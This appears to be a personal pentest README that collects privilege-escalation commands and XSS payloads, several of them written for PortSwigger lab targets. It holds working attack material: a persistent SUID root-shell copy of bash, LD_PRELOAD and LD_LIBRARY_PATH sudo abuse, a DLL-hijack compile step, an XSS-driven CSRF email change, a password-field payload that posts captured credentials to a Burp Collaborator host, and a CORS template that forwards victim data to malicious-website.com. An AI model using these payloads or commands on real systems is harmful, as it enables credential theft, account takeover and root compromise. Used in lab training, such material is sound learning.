# Pentest-tools and Knowledge

This repo will contain some of my own pentest scripts and useful commands.
- [Enumeration](#Enumeration)
- [PrivEsc Linux](#PrivEsc_Linux)
- [PrivEsc Windows](#PrivEsc_Windows)

<a name="Enumeration"></a>
## Enumeration

### List open tcp ports (nmap)
```bash
.\list_open_tcp_ports.sh <IP>
```

<a name="PrivEsc_Linux"></a>
## PrivEsc Linux

### Spawn Root Shell using C
```bash
./root_shell.c
```

### Create copy of /bin/bash
```bash
cp /bin/bash /tmp/evil_bash; chmod +s /tmp/evil_bash
```
Run:
```bash
/tmp/evil_bash -p
```

### SSH Port Forwarding
```bash
ssh -L 8000:localhost:8000 <username>@<target-ip>
```

### Weak File Permissions
Find readable files:
```bash
find /etc -maxdepth 1 -readable -type f
```
Find writable files:
```bash
find /etc -maxdepth 1 -writable -type f
```
Find directories with write access:
```bash
find / -executable -writable -type d 2> /dev/null
```

### Abuse LD_PRELOAD (sudo)

Check:
```bash
sudo -l
```
env_keep+=LD_PRELOAD must be set!

```bash
sudo LD_PRELOAD=/tmp/preload.so <program>
```

### Abuse LD_LIBRARY_PATH (sudo)

Check:
```bash
sudo -l
```
env_keep+=LD_LIBRARY_PATH must be set!

Choose one object from the list. Rename script.
Store script in the current dir.
```bash
ldd /usr/sbin/apache2
```

```bash
sudo LD_LIBRARY_PATH=. apache2
```

### SUID / SGID Files

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

<a name="PrivEsc_Windows"></a>
## PrivEsc Windows

### DLL_Hijacking

PocMon can be used to find the vulnerability.
Before use -> edit exploit

Compile:
```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```


## XSS 

### Exploiting XSS to perform CSRF

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### Exploit password field with autocomplete

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"> 
```

### Use iframe to trigger onresize

```
<iframe src="https://ac7a1fad1f4206c0c05957a9000c0026.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>
```

### Use custom tag to trigger onfocus

```
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

### XSS with SVG markup

```
https://your-lab-id.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>
```

### Bypass HTML-encoded angle brackets (payload get's reflected inside a quoted attribute)

```
"onmouseover="alert(1)
```

### CORS Template for exploit server

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
}; 
```
